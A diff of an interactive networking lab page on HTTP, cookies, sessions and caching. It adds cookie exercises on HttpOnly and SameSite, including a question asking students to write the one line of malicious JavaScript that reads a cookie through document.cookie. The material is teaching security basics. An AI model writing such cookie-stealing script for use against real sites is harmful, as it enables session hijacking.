@@ -7,18 +7,18 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#f0f4f8;--card:#ffffff;--navy:#1D3461;--navy-light:#2a4a87;
-  --teal:#0F6E56;--teal-bg:#E1F5EE;--teal-bd:#5DCAA5;
-  --purple:#3C3489;--purple-bg:#EEEDFE;--purple-bd:#AFA9EC;
-  --amber:#633806;--amber-bg:#FAEEDA;--amber-bd:#EF9F27;
-  --red:#791F1F;--red-bg:#FCEBEB;--red-bd:#F09595;
-  --blue-bg:#E6F1FB;--blue-bd:#85B7EB;
-  --lock:#1a5276;--lock-bg:#d6eaf8;--lock-bd:#5dade2;
-  --cookie:#7A3B00;--cookie-bg:#FFF3E0;--cookie-bd:#FFB74D;
-  --txt:#1d1d1c;--txt2:#5f5e5a;--txt3:#888780;
-  --bdr:#d8d6cf;--bdr2:#b8b6af;--radius:10px;
-  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;
-  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+ --bg:#f0f4f8;--card:#ffffff;--navy:#1D3461;--navy-light:#2a4a87;
+ --teal:#0F6E56;--teal-bg:#E1F5EE;--teal-bd:#5DCAA5;
+ --purple:#3C3489;--purple-bg:#EEEDFE;--purple-bd:#AFA9EC;
+ --amber:#633806;--amber-bg:#FAEEDA;--amber-bd:#EF9F27;
+ --red:#791F1F;--red-bg:#FCEBEB;--red-bd:#F09595;
+ --blue-bg:#E6F1FB;--blue-bd:#85B7EB;
+ --lock:#1a5276;--lock-bg:#d6eaf8;--lock-bd:#5dade2;
+ --cookie:#7A3B00;--cookie-bg:#FFF3E0;--cookie-bd:#FFB74D;
+ --txt:#1d1d1c;--txt2:#5f5e5a;--txt3:#888780;
+ --bdr:#d8d6cf;--bdr2:#b8b6af;--radius:10px;
+ --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;
+ --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
 }
 html,body{min-height:100%;background:var(--bg);font-family:var(--sans);color:var(--txt);font-size:15px;line-height:1.6}
 .shell{display:flex;min-height:100vh}
@@ -176,71 +176,71 @@ textarea.answered{border-color:var(--teal-bd);background:#fafffe}
 .ap-modal .ap-dismiss:hover{background:#2a4a87}
 .ap-sub{font-size:12.5px;color:#A32D2D;margin-bottom:1rem;min-height:18px}
 @media print{
-  .sidebar,.topbar-right,.nav-btns,.toast,.ap-overlay{display:none !important}
-  .main{padding:0;max-width:100%}
-  .exercise-card{display:block !important;break-inside:avoid;box-shadow:none;border:1px solid #ccc;margin-bottom:1rem}
-  .completion-card{display:none !important}
-  textarea{border:1px solid #ccc;min-height:50px}
-  body{font-size:12px}
+ .sidebar,.topbar-right,.nav-btns,.toast,.ap-overlay{display:none !important}
+ .main{padding:0;max-width:100%}
+ .exercise-card{display:block !important;break-inside:avoid;box-shadow:none;border:1px solid #ccc;margin-bottom:1rem}
+ .completion-card{display:none !important}
+ textarea{border:1px solid #ccc;min-height:50px}
+ body{font-size:12px}
 }
 </style>
 </head>
 <body>
 <div class="ap-overlay" id="apOverlay">
-  <div class="ap-modal">
-    <div class="ap-icon">&#xFE0F;</div>
-    <h2>Paste detected</h2>
-    <p id="apMsg">Copy-pasting is not allowed in this lab. Please type your answer in your own words.</p>
-    <div class="strikes-row" id="apStrikeRow"></div>
-    <p id="apSubMsg" class="ap-sub"></p>
-    <button class="ap-dismiss" onclick="dismissWarning()">I understand — I will type my answer</button>
-  </div>
+ <div class="ap-modal">
+ <div class="ap-icon"></div>
+ <h2>Paste detected</h2>
+ <p id="apMsg">Copy-pasting is not allowed in this lab. Please type your answer in your own words.</p>
+ <div class="strikes-row" id="apStrikeRow"></div>
+ <p id="apSubMsg" class="ap-sub"></p>
+ <button class="ap-dismiss" onclick="dismissWarning()">I understand — I will type my answer</button>
+ </div>
 </div>
 <div class="shell">
 <nav class="sidebar" id="sidebar">
-  <div class="sidebar-logo">HTTP, Cookies &amp; Cache <span class="mod-badge">Mod 2</span></div>
-  <div class="sidebar-title">Exercises</div>
-  <div id="navItems"></div>
-  <div class="progress-bar-wrap">
-    <div class="progress-bar-label"><span>Overall progress</span><span id="progPct">0%</span></div>
-    <div class="progress-bar"><div class="progress-fill" id="progFill" style="width:0%"></div></div>
-  </div>
+ <div class="sidebar-logo">HTTP, Cookies &amp; Cache <span class="mod-badge">Mod 2</span></div>
+ <div class="sidebar-title">Exercises</div>
+ <div id="navItems"></div>
+ <div class="progress-bar-wrap">
+ <div class="progress-bar-label"><span>Overall progress</span><span id="progPct">0%</span></div>
+ <div class="progress-bar"><div class="progress-fill" id="progFill" style="width:0%"></div></div>
+ </div>
 </nav>
 <main class="main">
-  <div class="topbar">
-    <div class="topbar-left">
-      <h1>Module 2 — HTTP, Cookies, Sessions &amp; Cache</h1>
-      <p>Computer Networks Lab &middot; Developer Track &middot; est. 60 min</p>
-    </div>
-    <div class="topbar-right">
-      <div class="strike-chip" id="strikeChip" style="display:none"> Paste detected</div>
-      <button class="btn-ghost" onclick="saveDraft()"> Save draft</button>
-      <button class="btn-ghost" onclick="window.print()"> Print / PDF</button>
-    </div>
-  </div>
-  <div class="student-banner">
-    <h3>Student information</h3>
-    <div class="student-grid">
-      <div class="field-group"><label for="f-name">Full name</label><input type="text" id="f-name" placeholder="Your name" oninput="updateProgress()"></div>
-      <div class="field-group"><label for="f-id">Student ID</label><input type="text" id="f-id" placeholder="e.g. s1234567" oninput="updateProgress()"></div>
-      <div class="field-group"><label for="f-class">Class / section</label><input type="text" id="f-class" placeholder="e.g. CN2-A" oninput="updateProgress()"></div>
-      <div class="field-group"><label for="f-date">Date</label><input type="date" id="f-date" oninput="updateProgress()"></div>
-    </div>
-    <div style="margin-top:.9rem">
-      <div style="font-size:11px;font-weight:600;color:var(--txt3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px">Academic integrity log</div>
-      <div class="ilog" id="ilog"><div class="il-e">Lab opened &#x2014; integrity monitoring active.</div></div>
-    </div>
-  </div>
-  <div id="exerciseContainer"></div>
-  <div class="completion-card" id="completionCard">
-    <div class="check"></div>
-    <h2>Lab complete!</h2>
-    <p>All questions answered. Download your responses and submit the JSON file to your course portal.</p>
-    <div class="completion-actions">
-      <button class="btn-success" onclick="downloadJSON()"> Download answers (.json)</button>
-      <button class="btn-ghost" onclick="window.print()"> Print / PDF</button>
-    </div>
-  </div>
+ <div class="topbar">
+ <div class="topbar-left">
+ <h1>Module 2 — HTTP, Cookies, Sessions &amp; Cache</h1>
+ <p>Computer Networks Lab &middot; Developer Track &middot; est. 60 min</p>
+ </div>
+ <div class="topbar-right">
+ <div class="strike-chip" id="strikeChip" style="display:none"> Paste detected</div>
+ <button class="btn-ghost" onclick="saveDraft()"> Save draft</button>
+ <button class="btn-ghost" onclick="window.print()"> Print / PDF</button>
+ </div>
+ </div>
+ <div class="student-banner">
+ <h3>Student information</h3>
+ <div class="student-grid">
+ <div class="field-group"><label for="f-name">Full name</label><input type="text" id="f-name" placeholder="Your name" oninput="updateProgress()"></div>
+ <div class="field-group"><label for="f-id">Student ID</label><input type="text" id="f-id" placeholder="e.g. s1234567" oninput="updateProgress()"></div>
+ <div class="field-group"><label for="f-class">Class / section</label><input type="text" id="f-class" placeholder="e.g. CN2-A" oninput="updateProgress()"></div>
+ <div class="field-group"><label for="f-date">Date</label><input type="date" id="f-date" oninput="updateProgress()"></div>
+ </div>
+ <div style="margin-top:.9rem">
+ <div style="font-size:11px;font-weight:600;color:var(--txt3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px">Academic integrity log</div>
+ <div class="ilog" id="ilog"><div class="il-e">Lab opened &#x2014; integrity monitoring active.</div></div>
+ </div>
+ </div>
+ <div id="exerciseContainer"></div>
+ <div class="completion-card" id="completionCard">
+ <div class="check"></div>
+ <h2>Lab complete!</h2>
+ <p>All questions answered. Download your responses and submit the JSON file to your course portal.</p>
+ <div class="completion-actions">
+ <button class="btn-success" onclick="downloadJSON()"> Download answers (.json)</button>
+ <button class="btn-ghost" onclick="window.print()"> Print / PDF</button>
+ </div>
+ </div>
 </main>
 </div>
 <div class="toast" id="toast"></div>
@@ -248,158 +248,166 @@ textarea.answered{border-color:var(--teal-bd);background:#fafffe}
 var EXERCISES=[
 
 // =========================================================
-// EX 1 — HTTP in Action: Protocols & Status Codes  (~20 min)
+// EX 1 — HTTP in Action: Protocols & Status Codes (~20 min)
 // =========================================================
 {id:'ex1',tag:'Exercise 1 \u00b7 ~20 min',tagColor:'#1a5276',tagBg:'#d6eaf8',
 title:'HTTP in Action \u2014 Protocols &amp; Status Codes',
 desc:'Trace a full HTTP/TCP exchange, decode status codes, diagnose failures, and compare TCP vs UDP using the interactive animation.',
 setup:'Open the animation at <strong><a href="https://earthmahanan.github.io/960231_network/mod2_http.html#http" target="_blank">https://earthmahanan.github.io/960231_network/mod2_http.html#http</a></strong> in a browser tab alongside this lab.',
 sections:[
-  {heading:'Part 1 \u2014 Anatomy of an HTTP Request',type:'info',color:'blue',icon:'',
-   title:'Goal: identify every stage of a successful TCP/HTTP exchange',
-   body:'In the animation use <strong>GET</strong> method and <strong>200</strong> response code. Click Reset, then use <strong>Step \u2192</strong> to walk through one stage at a time.'},
-  {heading:'Task 1A \u2014 Order the stages',
-   intro:'Six things happen but are listed below in scrambled order. Number them 1\u20136 in the correct order the animation shows them, and write one sentence describing what happens at each stage.',
-   type:'order-stages-table'},
-  {heading:'Task 1B \u2014 Read the headers',
-   intro:'Step through the animation until the REQUEST and RESPONSE panels are fully populated. Fill in the blanks below.',
-   type:'headers-table'},
-  {heading:'Task 1C \u2014 Quick questions',questions:[
-    {id:'4q1',text:'Q1. Why does the browser need DNS before TCP can begin?',rows:2},
-    {id:'4q2',text:'Q2. How many round trips does the TCP handshake cost before any HTTP data is sent?',rows:2},
-    {id:'4q3',text:'Q3. Which response header tells the browser how long it may cache the response?',rows:1},
-    {id:'4q4',text:'Q4. If the user reloads the page immediately, which stages can be skipped and why?',rows:3},
-  ]},
-  {heading:'Part 2 \u2014 Status Code Investigator',type:'info',color:'teal',icon:'',
-   title:'Goal: recognise the 2xx\u2013 5xx families and diagnose real scenarios',
-   body:'Use the status-code buttons in the animation to trigger each response. The reference table below lists all codes covered.'},
-  {heading:'Status code reference',type:'status-ref-table'},
-  {heading:'Task 2A \u2014 Diagnose the scenario',
-   intro:'For each situation below, write the status code you would expect and explain in one sentence why.',
-   type:'diagnose-table'},
-  {heading:'Task 2B \u2014 Family fluency',questions:[
-    {id:'4q5',text:'Q5. What is the difference between 401 Unauthorized and 403 Forbidden?',rows:3},
-    {id:'4q6',text:'Q6. Why might a developer prefer 307 Temporary Redirect over 302 Found for a POST request?',rows:3},
-  ]},
-  {heading:'Part 3 \u2014 When Things Go Wrong',type:'info',color:'red',icon:'',
-   title:'Goal: distinguish network-layer failures from server-layer failures',
-   body:'In the animation trigger each failure scenario below. Fill in the table as you go.'},
-  {heading:'Failure scenario table',type:'failure-table'},
-  {heading:'Reflection',questions:[
-    {id:'4q8',text:'Q8. 500 and 502 both say \"something on the server is broken.\" What is different about them, and why does it matter to a site reliability engineer?',rows:3},
-    {id:'4q9',text:'Q9. Which status code suggests you should wait and retry rather than fix your own request?',rows:2},
-  ]},
-  {heading:'Part 4 \u2014 TCP vs UDP',type:'info',color:'purple',icon:'',
-   title:'Goal: know when to use each protocol',
-   body:'For each application below, choose TCP or UDP and justify your choice in one line.'},
-  {heading:'Task 4C \u2014 Pick the right protocol',
-   intro:'For each application, choose TCP or UDP and justify in one line:',
-   type:'protocol-picker-table'},
+ {heading:'Part 1 \u2014 Anatomy of an HTTP Request',type:'info',color:'blue',icon:'',
+ title:'Goal: identify every stage of a successful TCP/HTTP exchange',
+ body:'In the animation use <strong>GET</strong> method and <strong>200</strong> response code. Click Reset, then use <strong>Step \u2192</strong> to walk through one stage at a time.'},
+ {heading:'Task 1A \u2014 Order the stages',
+ intro:'Six things happen but are listed below in scrambled order. Number them 1\u20136 in the correct order the animation shows them, and write one sentence describing what happens at each stage.',
+ type:'order-stages-table'},
+ {heading:'Task 1B \u2014 Read the headers',
+ intro:'Step through the animation until the REQUEST and RESPONSE panels are fully populated. Fill in the blanks below.',
+ type:'headers-table'},
+ {heading:'Task 1C \u2014 Quick questions',questions:[
+ {id:'4q1',text:'Q1. Why does the browser need DNS before TCP can begin?',rows:2},
+ {id:'4q2',text:'Q2. How many round trips does the TCP handshake cost before any HTTP data is sent?',rows:2},
+ {id:'4q3',text:'Q3. Which response header tells the browser how long it may cache the response?',rows:1},
+ {id:'4q4',text:'Q4. If the user reloads the page immediately, which stages can be skipped and why?',rows:3},
+ ]},
+ {heading:'Part 2 \u2014 Status Code Investigator',type:'info',color:'teal',icon:'',
+ title:'Goal: recognise the 2xx\u2013 5xx families and diagnose real scenarios',
+ body:'Use the status-code buttons in the animation to trigger each response. The reference table below lists all codes covered.'},
+ {heading:'Status code reference',type:'status-ref-table'},
+ {heading:'Task 2A \u2014 Diagnose the scenario',
+ intro:'For each situation below, write the status code you would expect and explain in one sentence why.',
+ type:'diagnose-table'},
+ {heading:'Task 2B \u2014 Family fluency',questions:[
+ {id:'4q5',text:'Q5. What is the difference between 401 Unauthorized and 403 Forbidden?',rows:3},
+ {id:'4q6',text:'Q6. Why might a developer prefer 307 Temporary Redirect over 302 Found for a POST request?',rows:3},
+ ]},
+ {heading:'Part 3 \u2014 When Things Go Wrong',type:'info',color:'red',icon:'',
+ title:'Goal: distinguish network-layer failures from server-layer failures',
+ body:'In the animation trigger each failure scenario below. Fill in the table as you go.'},
+ {heading:'Failure scenario table',type:'failure-table'},
+ {heading:'Reflection',questions:[
+ {id:'4q8',text:'Q8. 500 and 502 both say \"something on the server is broken.\" What is different about them, and why does it matter to a site reliability engineer?',rows:3},
+ {id:'4q9',text:'Q9. Which status code suggests you should wait and retry rather than fix your own request?',rows:2},
+ ]},
+ {heading:'Part 4 \u2014 TCP vs UDP',type:'info',color:'purple',icon:'',
+ title:'Goal: know when to use each protocol',
+ body:'For each application below, choose TCP or UDP and justify your choice in one line.'},
+ {heading:'Task 4C \u2014 Pick the right protocol',
+ intro:'For each application, choose TCP or UDP and justify in one line:',
+ type:'protocol-picker-table'},
 ]},
 
-// EX 2 — COOKIES  (~10 min)
+// EX 2 — COOKIES (~10 min)
 // =========================================================
-{id:'ex2',tag:'Exercise 2 \u00b7 ~10 min',tagColor:'#0C447C',tagBg:'#E6F1FB',
+{id:'ex2',tag:'Exercise 2 \u00b7 ~20 min',tagColor:'#0C447C',tagBg:'#E6F1FB',
 title:'Cookies \u2014 Spy on Your Browser',
 desc:'Use DevTools to inspect real cookies on a live site. Read every attribute and understand what it does.',
 setup:'Open Chrome or Firefox. You will use the DevTools Application panel.',
 sections:[
-  {heading:'Background \u2014 HTTP is stateless; cookies are the fix',type:'info',color:'cookie',icon:'',
-   title:'HTTP forgets you between requests \u2014 cookies remember you',
-   body:'Every HTTP request is independent. The server has no memory of you. <strong>Cookies</strong> are small key=value strings planted by the server via <code>Set-Cookie</code>. Your browser stores them and automatically sends them back on every future request to that domain \u2014 giving the server its "memory" of you.'},
-  {heading:'The cookie lifecycle \u2014 one full exchange',type:'cookie-flow'},
-  {heading:'Step 1 \u2014 Open DevTools on a real site',
-   intro:'Go to <strong>github.com</strong>. Press F12 \u2192 Application tab \u2192 Storage \u2192 Cookies \u2192 click the domain.',
-   type:'os-cmd',cmds:[{os:'All browsers',tag:'mac',cmd:'F12  \u2192  Application  \u2192  Cookies  \u2192  github.com'}],
-   note:'Columns to look for: <strong>Name \u00b7 Value \u00b7 Domain \u00b7 Expires \u00b7 HttpOnly \u00b7 Secure \u00b7 SameSite</strong>'},
-  {heading:'DevTools hint',type:'devtools-hint'},
-  {heading:'Step 2 \u2014 Record 3 cookies you found',
-   intro:'Fill in the table. Pay attention to HttpOnly and Secure columns.',
-   type:'cookie-observe-table'},
-  {heading:'Step 3 \u2014 Cookie attribute quiz',intro:'Match each attribute to its purpose:',type:'cookie-attr-quiz'},
-  {heading:'Reflection',questions:[
-    {id:'1r1',text:'Q1. You found a cookie with HttpOnly=true. What attack does this attribute prevent? Name it specifically.',rows:2},
-    {id:'1r2',text:'Q2. A cookie has no Expires or Max-Age set. What type is it and when does it disappear?',rows:2},
-    {id:'1r3',text:'Q3. A junior dev wants to store the shopping cart in a cookie. Give two reasons this is a bad idea.',rows:3},
-  ]}
+ {heading:'Background \u2014 HTTP is stateless; cookies are the fix',type:'info',color:'cookie',icon:'',
+ title:'HTTP forgets you between requests \u2014 cookies remember you',
+ body:'Every HTTP request is independent. The server has no memory of you. <strong>Cookies</strong> are small key=value strings planted by the server via <code>Set-Cookie</code>. Your browser stores them and automatically sends them back on every future request to that domain \u2014 giving the server its "memory" of you.'},
+ {heading:'The cookie lifecycle \u2014 one full exchange',type:'cookie-flow'},
+ {heading:'Step 1 \u2014 Open DevTools on a real site',
+ intro:'Go to <strong>github.com</strong>. Press F12 \u2192 Application tab \u2192 Storage \u2192 Cookies \u2192 click the domain.',
+ type:'os-cmd',cmds:[{os:'All browsers',tag:'mac',cmd:'F12 \u2192 Application \u2192 Cookies \u2192 github.com'}],
+ note:'Columns to look for: <strong>Name \u00b7 Value \u00b7 Domain \u00b7 Expires \u00b7 HttpOnly \u00b7 Secure \u00b7 SameSite</strong>'},
+ {heading:'DevTools hint',type:'devtools-hint'},
+ {heading:'Step 2 \u2014 Record 3 cookies you found',
+ intro:'Fill in the table. Pay attention to HttpOnly and Secure columns.',
+ type:'cookie-observe-table'},
+ {heading:'Step 3 \u2014 Cookie attribute quiz',intro:'Match each attribute to its purpose:',type:'cookie-attr-quiz'},
+ {heading:'Step 4 \u2014 Spot the Difference ',type:'spot-the-diff'},
+ {heading:'Step 5 \u2014 SameSite \uFE0F The CSRF Shield',type:'samesite-lab'},
+ {heading:'Reflection',questions:[
+ {id:'1r1',text:'Q1. You found a cookie with HttpOnly=true. What attack does this attribute prevent? Name it specifically.',rows:2},
+ {id:'1r2',text:'Q2. A cookie has no Expires or Max-Age set. What type is it and when does it disappear?',rows:2},
+ {id:'1r3',text:'Q3. A junior dev wants to store the shopping cart in a cookie. Give two reasons this is a bad idea.',rows:3},
+ {id:'1r4',text:'Q4. Spot the Difference \u2014 A1. Cookie A has HttpOnly; Cookie B does not. Both are in your browser. Type document.cookie in the browser Console. Which cookie appears in the output and which is invisible? Explain why.',rows:3},
+ {id:'1r5',text:'Q5. Spot the Difference \u2014 A2. Cookie B is missing HttpOnly. Write the ONE line of malicious JavaScript an attacker types in the console to steal its value. (Hint: uses document.cookie)',rows:2},
+ {id:'1r6',text:'Q6. The Expiry Trap \u2014 A user logs into a banking app. The session cookie has Max-Age=2592000 (30 days), HttpOnly, Secure. The user walks away from a shared computer without logging out.\n(a) Is the session still valid 10 days later if someone else uses the same browser?\n(b) What should the developer have done differently for a banking app vs a normal site?\n(c) What is the difference between client-side cookie expiry and server-side session expiry?',rows:6},
+ {id:'1r7',text:'Q7. \uFE0F SameSite \u2014 You are building a Thai e-commerce site. A user clicks a link in a promotional email and lands on your product page. Which SameSite value should the session cookie use so the user is still logged in when they arrive? Explain your choice.',rows:3},
+ {id:'1r8',text:'Q8. \uFE0F SameSite \u2014 A developer says: "I set SameSite=None on my login cookie so the payment iframe can read it." Name TWO security risks this creates and what they should do instead.',rows:4},
+ {id:'1r9',text:'Q9. \uFE0F SameSite \u2014 Look at the SameSite column in DevTools on github.com. Find one cookie with SameSite=Lax and one with SameSite=Strict. Why do you think GitHub chose different values for different cookies?',rows:4},
+ ]}
 ]},
 
 // =========================================================
-// EX 3 — SESSIONS  (~10 min)
+// EX 3 — SESSIONS (~10 min)
 // =========================================================
 {id:'ex3',tag:'Exercise 3 \u00b7 ~10 min',tagColor:'#3C3489',tagBg:'#EEEDFE',
 title:'Sessions \u2014 The Server Remembers You',
 desc:'Trace the session handshake step-by-step and find the session cookie in DevTools.',
 setup:'Keep your browser open and log in to any website (GitHub, university portal, etc.).',
 sections:[
-  {heading:'Background \u2014 Cookies vs Sessions',type:'info',color:'purple',icon:'',
-   title:'Cookies live in the browser. Session data lives on the server.',
-   body:'Cookies have a <strong>4 KB limit</strong> and are readable by JavaScript (unless HttpOnly). Sessions solve this: the server keeps all user data, and the cookie only carries a <strong>random session ID</strong> \u2014 like a locker number. Nobody can guess what is in locker #A3F9... unless they steal the key.'},
-  {heading:'Session handshake \u2014 every step',type:'session-flow'},
-  {heading:'Step 1 \u2014 Find the session cookie in DevTools',
-   intro:'Log in to any site. In Application \u2192 Cookies, look for <code>sessionid</code>, <code>PHPSESSID</code>, <code>connect.sid</code>, or similar.',
-   type:'os-cmd',cmds:[{os:'What to look for',tag:'mac',cmd:'Name: sessionid / PHPSESSID / connect.sid\nValue: a long random string\nHttpOnly:    Secure: '}],
-   note:'The value is a random locker number \u2014 the real data lives on the server.'},
-  {heading:'Step 2 \u2014 Session details table',intro:'Fill in what you found:',type:'session-details-table'},
-  {heading:'Step 3 \u2014 First-party vs Third-party cookies',type:'info',color:'amber',icon:'',
-   title:'Not all cookies are from sites you deliberately visit',
-   body:'When nytimes.com embeds an ad from <strong>AdX.com</strong>, AdX can also set a cookie. Since you did not navigate to AdX.com yourself, this is a <strong>third-party cookie</strong>. AdX can track you across every site showing their ads. Modern browsers are phasing these out.'},
-  {heading:'The sock ad mystery',type:'third-party-scenario'},
-  {heading:'Reflection',questions:[
-    {id:'2r1',text:'Q1. In your own words, trace the full session flow: what does the server send on successful login? What does the browser send on the next request? What does the server do with it?',rows:4},
-    {id:'2r2',text:'Q2. An attacker steals a sessionID cookie via XSS. What can they do? What is this attack called? How does server-side session expiry limit the damage?',rows:3},
-  ]}
+ {heading:'Background \u2014 Cookies vs Sessions',type:'info',color:'purple',icon:'',
+ title:'Cookies live in the browser. Session data lives on the server.',
+ body:'Cookies have a <strong>4 KB limit</strong> and are readable by JavaScript (unless HttpOnly). Sessions solve this: the server keeps all user data, and the cookie only carries a <strong>random session ID</strong> \u2014 like a locker number. Nobody can guess what is in locker #A3F9... unless they steal the key.'},
+ {heading:'Session handshake \u2014 every step',type:'session-flow'},
+ {heading:'Step 1 \u2014 Find the session cookie in DevTools',
+ intro:'Log in to any site. In Application \u2192 Cookies, look for <code>sessionid</code>, <code>PHPSESSID</code>, <code>connect.sid</code>, or similar.',
+ type:'os-cmd',cmds:[{os:'What to look for',tag:'mac',cmd:'Name: sessionid / PHPSESSID / connect.sid\nValue: a long random string\nHttpOnly: Secure: '}],
+ note:'The value is a random locker number \u2014 the real data lives on the server.'},
+ {heading:'Step 2 \u2014 Session details table',intro:'Fill in what you found:',type:'session-details-table'},
+ {heading:'Step 3 \u2014 First-party vs Third-party cookies',type:'info',color:'amber',icon:'',
+ title:'Not all cookies are from sites you deliberately visit',
+ body:'When nytimes.com embeds an ad from <strong>AdX.com</strong>, AdX can also set a cookie. Since you did not navigate to AdX.com yourself, this is a <strong>third-party cookie</strong>. AdX can track you across every site showing their ads. Modern browsers are phasing these out.'},
+ {heading:'The sock ad mystery',type:'third-party-scenario'},
+ {heading:'Reflection',questions:[
+ {id:'2r1',text:'Q1. In your own words, trace the full session flow: what does the server send on successful login? What does the browser send on the next request? What does the server do with it?',rows:4},
+ {id:'2r2',text:'Q2. An attacker steals a sessionID cookie via XSS. What can they do? What is this attack called? How does server-side session expiry limit the damage?',rows:3},
+ ]}
 ]},
 
 // =========================================================
-// EX 4 — CACHING  (~10 min)
+// EX 4 — CACHING (~10 min)
 // =========================================================
 {id:'ex4',tag:'Exercise 4 \u00b7 ~10 min',tagColor:'#0F6E56',tagBg:'#E1F5EE',
 title:'HTTP Caching \u2014 "I\'ve Seen This Before"',
 desc:'Watch the browser serve a 304 Not Modified, decode Cache-Control headers, and learn when to bust the cache.',
 setup:'Open Chrome DevTools, Network tab. Make sure "Disable cache" is NOT checked.',
 sections:[
-  {heading:'Background \u2014 Why cache?',type:'info',color:'teal',icon:'',
-   title:'Downloading the same logo 1,000 times is wasteful',
-   body:'Caching lets the browser (or a proxy) keep a local copy and reuse it \u2014 no network trip needed. Result: faster pages, less server load, lower bills. As a developer, knowing this saves you the "why is my fix not live?!" panic at 3am.'},
-  {heading:'The three caching scenarios',type:'cache-scenarios'},
-  {heading:'Step 1 \u2014 Observe caching in DevTools',
-   intro:'Navigate to github.com. Hard-reload (Ctrl+Shift+R), then normal reload (F5). Compare the Status column.',
-   type:'os-cmd',
-   cmds:[
-     {os:'Hard reload \u2014 forces full re-download',tag:'mac',cmd:'Ctrl+Shift+R  (Windows)  /  Cmd+Shift+R  (Mac)'},
-     {os:'Normal reload \u2014 browser checks cache',tag:'mac',cmd:'F5  (Windows)  /  Cmd+R  (Mac)'},
-   ],
-   note:'Look for <strong>304 Not Modified</strong>, <strong>"from disk cache"</strong>, or <strong>"from memory cache"</strong> in the Status column after the normal reload.'},
-  {heading:'Cache headers observation table',
-   intro:'Click any CSS/JS/image resource \u2192 Response Headers. Record what you find:',
-   type:'cache-observe-table'},
-  {heading:'Step 2 \u2014 Decode a Cache-Control header',type:'cache-decode'},
-  {heading:'Step 3 \u2014 How Conditional GET works',type:'conditional-get'},
-  {heading:'Cache-Control directive quiz',intro:'Match each directive to its meaning:',type:'cache-quiz'},
-  {heading:'Reflection',questions:[
-    {id:'3r1',text:'Q1. You deployed a bug fix to main.js but users still see the old version. Cache-Control: max-age=86400 is set. What is happening? Give two strategies to force users to get the new file.',rows:4},
-    {id:'3r2',text:'Q2. A bank account balance page is cached by a CDN. Why is this dangerous? What Cache-Control value prevents it?',rows:3},
-  ]}
+ {heading:'Background \u2014 Why cache?',type:'info',color:'teal',icon:'',
+ title:'Downloading the same logo 1,000 times is wasteful',
+ body:'Caching lets the browser (or a proxy) keep a local copy and reuse it \u2014 no network trip needed. Result: faster pages, less server load, lower bills. As a developer, knowing this saves you the "why is my fix not live?!" panic at 3am.'},
+ {heading:'The three caching scenarios',type:'cache-scenarios'},
+ {heading:'Step 1 \u2014 Observe caching in DevTools',
+ intro:'Navigate to github.com. Hard-reload (Ctrl+Shift+R), then normal reload (F5). Compare the Status column.',
+ type:'os-cmd',
+ cmds:[
+ {os:'Hard reload \u2014 forces full re-download',tag:'mac',cmd:'Ctrl+Shift+R (Windows) / Cmd+Shift+R (Mac)'},
+ {os:'Normal reload \u2014 browser checks cache',tag:'mac',cmd:'F5 (Windows) / Cmd+R (Mac)'},
+ ],
+ note:'Look for <strong>304 Not Modified</strong>, <strong>"from disk cache"</strong>, or <strong>"from memory cache"</strong> in the Status column after the normal reload.'},
+ {heading:'Cache headers observation table',
+ intro:'Click any CSS/JS/image resource \u2192 Response Headers. Record what you find:',
+ type:'cache-observe-table'},
+ {heading:'Step 2 \u2014 Decode a Cache-Control header',type:'cache-decode'},
+ {heading:'Step 3 \u2014 How Conditional GET works',type:'conditional-get'},
+ {heading:'Cache-Control directive quiz',intro:'Match each directive to its meaning:',type:'cache-quiz'},
+ {heading:'Reflection',questions:[
+ {id:'3r1',text:'Q1. You deployed a bug fix to main.js but users still see the old version. Cache-Control: max-age=86400 is set. What is happening? Give two strategies to force users to get the new file.',rows:4},
+ {id:'3r2',text:'Q2. A bank account balance page is cached by a CDN. Why is this dangerous? What Cache-Control value prevents it?',rows:3},
+ ]}
 ]},
 
 // =========================================================
-// EX 5 — GRAND FINALE  (~10 min)
+// EX 5 — GRAND FINALE (~10 min)
 // =========================================================
 {id:'ex5',tag:'Exercise 5 \u00b7 ~10 min',tagColor:'#633806',tagBg:'#FAEEDA',
 title:'Grand Finale \u2014 One Journey, Five Mechanisms',
 desc:'Trace all five topics \u2014 HTTP, HTTPS, Cookies, Sessions, and Cache \u2014 through one realistic developer scenario.',
 setup:'No tools needed \u2014 just your understanding from Exercises 1\u20134.',
 sections:[
-  {heading:'The scenario \u2014 Alice shops on DevStore.th',type:'grand-scenario'},
-  {heading:'Step 1 \u2014 Annotate every event',
-   intro:'For each event, identify the mechanism and explain what is happening:',
-   type:'grand-table'},
-  {heading:'Step 2 \u2014 Architecture decisions',questions:[
-    {id:'5r1',text:'Q1. DevStore.th stores preferred language ("th"/"en") in a cookie, but stores payment methods on the server (referenced by sessionID). Explain why each piece of data belongs where it is stored.',rows:4},
-    {id:'5r2',text:'Q2. The homepage banner has Cache-Control: max-age=2592000 (30 days). The cart API has Cache-Control: no-store. Justify each choice \u2014 what goes wrong if you swap them?',rows:4},
-    {id:'5r3',text:'Q3. BONUS \u2014 Connect all five: describe step-by-step what happens from the moment Alice types "https://devstore.th" until she sees her personalised homepage. Include DNS, TCP, TLS handshake, HTTP request/response, cookies sent, and cached assets.',rows:6},
-  ]}
+ {heading:'The scenario \u2014 Alice shops on DevStore.th',type:'grand-scenario'},
+ {heading:'Step 1 \u2014 Annotate every event',
+ intro:'For each event, identify the mechanism and explain what is happening:',
+ type:'grand-table'},
+ {heading:'Step 2 \u2014 Architecture decisions',questions:[
+ {id:'5r1',text:'Q1. DevStore.th stores preferred language ("th"/"en") in a cookie, but stores payment methods on the server (referenced by sessionID). Explain why each piece of data belongs where it is stored.',rows:4},
+ {id:'5r2',text:'Q2. The homepage banner has Cache-Control: max-age=2592000 (30 days). The cart API has Cache-Control: no-store. Justify each choice \u2014 what goes wrong if you swap them?',rows:4},
+ {id:'5r3',text:'Q3. BONUS \u2014 Connect all five: describe step-by-step what happens from the moment Alice types "https://devstore.th" until she sees her personalised homepage. Include DNS, TCP, TLS handshake, HTTP request/response, cookies sent, and cached assets.',rows:6},
+ ]}
 ]}
 ];
 
